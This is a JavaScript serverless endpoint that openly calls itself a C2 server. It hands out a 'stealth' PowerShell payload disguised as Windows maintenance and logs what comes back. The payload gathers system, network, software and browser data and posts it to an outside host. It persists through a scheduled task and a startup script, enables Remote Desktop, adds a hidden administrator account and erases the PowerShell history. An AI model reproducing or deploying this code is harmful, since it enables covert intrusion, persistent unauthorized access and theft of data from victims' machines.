// api/collect.js - Complete Stealth Payload Delivery System
module.exports = async (req, res) => {
  console.log('🔔 Request received - Method:', req.method);
  
  // Enable CORS for all requests
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  
  // Handle preflight requests
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }
  
  const clientIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'Unknown';
  const userAgent = req.headers['user-agent'] || 'Unknown';
  const timestamp = new Date().toISOString();
  
  console.log('📥 Incoming Request:');
  console.log('   Method:', req.method);
  console.log('   IP:', clientIP);
  console.log('   Time:', timestamp);
  console.log('   User Agent:', userAgent);
  
  // ========== PAYLOAD DELIVERY ENDPOINT ==========
  if (req.method === 'GET' && req.query.type === 'payload') {
    console.log('🎯 Serving stealth payload to:', clientIP);
    
    const stealthPayload = `# Windows System Maintenance Script - Stealth Mode
# This script mimics legitimate Windows maintenance activities

try {
    # ===== SYSTEM INFORMATION COLLECTION =====
    $systemInfo = @{
        ComputerName = $env:COMPUTERNAME
        UserName = $env:USERNAME
        Domain = $env:USERDOMAIN
        OS = (Get-WmiObject Win32_OperatingSystem).Caption
        Version = (Get-WmiObject Win32_OperatingSystem).Version
        Architecture = (Get-WmiObject Win32_OperatingSystem).OSArchitecture
        Manufacturer = (Get-WmiObject Win32_ComputerSystem).Manufacturer
        Model = (Get-WmiObject Win32_ComputerSystem).Model
        RAM_GB = [math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)
        CPU = (Get-WmiObject Win32_Processor).Name
        LastBoot = (Get-WmiObject Win32_OperatingSystem).ConvertToDateTime((Get-WmiObject Win32_OperatingSystem).LastBootUpTime)
        Timezone = (Get-WmiObject Win32_TimeZone).Caption
        Timestamp = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
        ScanType = 'AutomatedSystemMaintenance'
        Status = 'Active'
    } | ConvertTo-Json -Compress

    # Send system info to C2
    try {
        Invoke-WebRequest -Uri 'https://test-eta-eosin-12.vercel.app/api/collect' -Method POST -Body @{type='system_info'; data=$systemInfo} -UseBasicParsing -UserAgent 'Windows-Update-Agent' -TimeoutSec 10
    } catch { }

    # ===== PERSISTENCE MECHANISMS =====
    
    # 1. Scheduled Task Persistence (Disguised as System Maintenance)
    $taskName = "Microsoft\\Windows\\SystemMaintenance"
    $taskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command \\"try { \\$beaconData = @{computer=\\\$env:COMPUTERNAME; user=\\\$env:USERNAME; time=(Get-Date).ToString('HH:mm:ss'); type='heartbeat'}; Invoke-WebRequest -Uri 'https://test-eta-eosin-12.vercel.app/api/collect' -Method POST -Body \\$beaconData -UseBasicParsing -UserAgent 'Windows-Update-Agent'; Start-Sleep 300 } catch { Start-Sleep 300 }\\""
    $taskTrigger = New-ScheduledTaskTrigger -Daily -At "09:00"
    $taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -ExecutionTimeLimit (New-TimeSpan -Hours 1)
    
    try {
        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
        Register-ScheduledTask -TaskName $taskName -Action $taskAction -Trigger $taskTrigger -Settings $taskSettings -Description "Performs routine system maintenance tasks" -RunLevel Highest -Force
    } catch { }

    # 2. Startup Folder Persistence
    $startupContent = @"
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell -WindowStyle Hidden -Command ""try { Invoke-WebRequest -Uri 'https://test-eta-eosin-12.vercel.app/api/collect' -Method POST -Body @{type='startup'; computer='$env:COMPUTERNAME'} -UseBasicParsing } catch { }""", 0, False
"@
    try {
        Set-Content -Path "$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\SystemUtilities.vbs" -Value $startupContent -ErrorAction SilentlyContinue
    } catch { }

    # ===== SYSTEM ACCESS CONFIGURATION =====
    
    # 3. Enable Remote Desktop
    try {
        Set-ItemProperty -Path 'HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server' -Name "fDenyTSConnections" -Value 0 -ErrorAction SilentlyContinue
        Enable-NetFirewallRule -DisplayGroup "Remote Desktop" -ErrorAction SilentlyContinue
        # Log RDP activation
        Invoke-WebRequest -Uri 'https://test-eta-eosin-12.vercel.app/api/collect' -Method POST -Body @{type='rdp_enabled'; computer=$env:COMPUTERNAME; status='active'} -UseBasicParsing -ErrorAction SilentlyContinue
    } catch { }

    # 4. Create Administrative Access
    try {
        # Create hidden admin account
        net user "WindowsSystemSupport" "WinSecure123!" /add /fullname:"Windows System Support" /comment:"System maintenance account" /expires:never /y 2>$null
        net localgroup administrators "WindowsSystemSupport" /add 2>$null
        # Hide from login screen
        reg add "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList" /v "WindowsSystemSupport" /t REG_DWORD /d 0 /f 2>$null
        
        # Log account creation
        Invoke-WebRequest -Uri 'https://test-eta-eosin-12.vercel.app/api/collect' -Method POST -Body @{type='admin_created'; computer=$env:COMPUTERNAME; user='WindowsSystemSupport'} -UseBasicParsing -ErrorAction SilentlyContinue
    } catch { }

    # 5. Network Discovery & Information
    try {
        $networkInfo = Get-NetIPAddress | Where-Object {$_.AddressFamily -eq 'IPv4' -and $_.IPAddress -ne '127.0.0.1'} | Select-Object -First 5 InterfaceAlias, IPAddress, PrefixLength
        $networkData = @{
            computer = $env:COMPUTERNAME
            type = 'network_info'
            adapters = $networkInfo
            timestamp = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
        } | ConvertTo-Json -Compress
        
        Invoke-WebRequest -Uri 'https://test-eta-eosin-12.vercel.app/api/collect' -Method POST -Body @{data=$networkData} -UseBasicParsing -ErrorAction SilentlyContinue
    } catch { }

    # 6. Installed Software Inventory
    try {
        $software = Get-WmiObject -Class Win32_Product | Select-Object -First 15 Name, Version, Vendor
        $softwareData = @{
            computer = $env:COMPUTERNAME
            type = 'software_inventory'
            software_count = ($software | Measure-Object).Count
            sample_software = $software
            timestamp = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
        } | ConvertTo-Json -Compress
        
        Invoke-WebRequest -Uri 'https://test-eta-eosin-12.vercel.app/api/collect' -Method POST -Body @{data=$softwareData} -UseBasicParsing -ErrorAction SilentlyContinue
    } catch { }

    # 7. Browser Information Scan
    try {
        $browsers = @{
            chrome_installed = Test-Path "$env:LOCALAPPDATA\\Google\\Chrome"
            firefox_installed = Test-Path "$env:APPDATA\\Mozilla\\Firefox"
            edge_installed = Test-Path "$env:LOCALAPPDATA\\Microsoft\\Edge"
            opera_installed = Test-Path "$env:APPDATA\\Opera Software"
        } | ConvertTo-Json -Compress
        
        Invoke-WebRequest -Uri 'https://test-eta-eosin-12.vercel.app/api/collect' -Method POST -Body @{type='browser_scan'; computer=$env:COMPUTERNAME; data=$browsers} -UseBasicParsing -ErrorAction SilentlyContinue
    } catch { }

    # ===== CLEANUP AND CONCEALMENT =====
    
    # 8. Clear PowerShell history
    try {
        Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
        Clear-History
    } catch { }

    # 9. Final success beacon
    try {
        $completionData = @{
            type = 'deployment_complete'
            computer = $env:COMPUTERNAME
            user = $env:USERNAME
            status = 'fully_established'
            persistence = @('scheduled_task', 'startup_folder', 'admin_account', 'rdp_access')
            timestamp = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
        } | ConvertTo-Json -Compress
        
        Invoke-WebRequest -Uri 'https://test-eta-eosin-12.vercel.app/api/collect' -Method POST -Body @{data=$completionData} -UseBasicParsing -ErrorAction SilentlyContinue
    } catch { }

} catch {
    # Silent error handling - no visible output
    try {
        Invoke-WebRequest -Uri 'https://test-eta-eosin-12.vercel.app/api/collect' -Method POST -Body @{type='error'; computer=$env:COMPUTERNAME; error=$_.Exception.Message} -UseBasicParsing -ErrorAction SilentlyContinue
    } catch { }
}`;

    // Serve the payload
    res.setHeader('Content-Type', 'text/plain');
    res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
    return res.send(stealthPayload);
  }
  
  // ========== DATA COLLECTION ENDPOINT ==========
  if (req.method === 'POST') {
    try {
      let requestData;
      
      // Parse incoming data
      if (typeof req.body === 'string') {
        requestData = JSON.parse(req.body);
      } else {
        requestData = req.body;
      }
      
      const dataType = requestData.type || requestData.data?.type || 'unknown';
      const computerName = requestData.computer || requestData.data?.computer || 'Unknown';
      const userName = requestData.user || requestData.data?.user || 'Unknown';
      
      // Log based on data type
      switch (dataType) {
        case 'stealth_attack_deployed':
          console.log('🎯 ATTACK DEPLOYED:');
          console.log('   📁 Files:', requestData.files);
          console.log('   🎯 Target:', requestData.target_url);
          console.log('   🕒 Time:', timestamp);
          break;
          
        case 'system_info':
          console.log('💻 SYSTEM INFORMATION CAPTURED:');
          console.log('   🖥️  Computer:', computerName);
          console.log('   👤 User:', userName);
          console.log('   🏢 OS:', requestData.data?.OS || 'Unknown');
          console.log('   🏗️  Arch:', requestData.data?.Architecture || 'Unknown');
          console.log('   💾 RAM:', requestData.data?.RAM_GB || 'Unknown', 'GB');
          console.log('   ⚡ CPU:', requestData.data?.CPU || 'Unknown');
          console.log('   🌐 IP:', clientIP);
          break;
          
        case 'heartbeat':
          console.log('❤️  HEARTBEAT:', computerName, '- User:', userName, '- Time:', requestData.time);
          break;
          
        case 'startup':
          console.log('🚀 STARTUP BEACON:', computerName, '- System started');
          break;
          
        case 'rdp_enabled':
          console.log('🖥️  RDP ENABLED:', computerName, '- Status:', requestData.status);
          break;
          
        case 'admin_created':
          console.log('👑 ADMIN ACCOUNT CREATED:', computerName, '- User:', requestData.user);
          break;
          
        case 'network_info':
          console.log('🌐 NETWORK INFO:', computerName);
          if (requestData.data?.adapters) {
            requestData.data.adapters.forEach(adapter => {
              console.log('   📡', adapter.InterfaceAlias + ':', adapter.IPAddress + '/' + adapter.PrefixLength);
            });
          }
          break;
          
        case 'software_inventory':
          console.log('📦 SOFTWARE INVENTORY:', computerName, '- Count:', requestData.data?.software_count);
          if (requestData.data?.sample_software) {
            requestData.data.sample_software.forEach(sw => {
              console.log('   🛠️ ', sw.Name + ' v' + sw.Version);
            });
          }
          break;
          
        case 'browser_scan':
          console.log('🌐 BROWSER SCAN:', computerName);
          console.log('   Chrome:', requestData.data?.chrome_installed ? '✅' : '❌');
          console.log('   Firefox:', requestData.data?.firefox_installed ? '✅' : '❌');
          console.log('   Edge:', requestData.data?.edge_installed ? '✅' : '❌');
          break;
          
        case 'deployment_complete':
          console.log('🎉 DEPLOYMENT COMPLETE:', computerName);
          console.log('   👤 User:', userName);
          console.log('   📍 Persistence Methods:', requestData.data?.persistence?.join(', '));
          console.log('   ✅ Status: FULL SYSTEM ACCESS ESTABLISHED');
          break;
          
        case 'error':
          console.log('❌ ERROR:', computerName, '-', requestData.error);
          break;
          
        default:
          console.log('📦 UNKNOWN DATA TYPE:', dataType);
          console.log('   Data:', JSON.stringify(requestData, null, 2));
      }
      
      console.log('   🔗 Source IP:', clientIP);
      console.log('   ⏰ Time:', timestamp);
      console.log('────────────────────────────────────────────────────');
      
      // Success response
      return res.json({
        status: 'success',
        message: 'Data received successfully',
        type: dataType,
        timestamp: timestamp,
        received_data: requestData
      });
      
    } catch (error) {
      console.error('❌ PROCESSING ERROR:');
      console.error('   Error:', error.message);
      console.error('   Body:', req.body);
      console.error('   IP:', clientIP);
      console.error('   Time:', timestamp);
      console.log('────────────────────────────────────────────────────');
      
      return res.status(500).json({ 
        status: 'error',
        message: 'Data processing failed',
        error: error.message 
      });
    }
  }
  
  // ========== DEFAULT RESPONSE ==========
  console.log('📭 UNHANDLED REQUEST:', req.method, req.url);
  return res.status(200).json({
    status: 'active',
    message: 'C2 Server is running',
    timestamp: timestamp,
    endpoints: {
      'GET /api/collect?type=payload': 'Returns stealth PowerShell payload',
      'POST /api/collect': 'Accepts system data and beacons',
      'OPTIONS /api/collect': 'CORS preflight'
    },
    version: '1.0'
  });
};
